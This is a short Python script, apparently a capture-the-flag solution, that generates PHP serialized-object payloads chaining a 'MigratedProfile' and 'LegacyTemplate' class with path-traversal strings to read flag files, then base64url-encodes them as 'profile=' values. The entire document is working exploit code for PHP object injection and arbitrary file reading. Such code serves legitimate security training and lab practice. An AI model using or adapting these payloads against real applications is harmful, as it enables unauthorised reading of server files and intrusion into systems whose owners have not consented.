import base64

paths = [
    "../../../../../flag",
    "../../../../../flag.txt",
    "../../../../../app/flag",
    "../../../../../app/flag.txt",
    "../../../../../var/www/flag.txt",
]

for path in paths:
    serialized = (
        'O:15:"MigratedProfile":1:'
        '{s:11:"displayName";'
        'O:14:"LegacyTemplate":1:'
        '{s:8:"template";s:%d:"%s";}}'
        % (len(path), path)
    )

    profile = base64.urlsafe_b64encode(
        serialized.encode()
    ).decode().rstrip("=")

    print("\n---", path, "---")
    print("profile=" + profile)
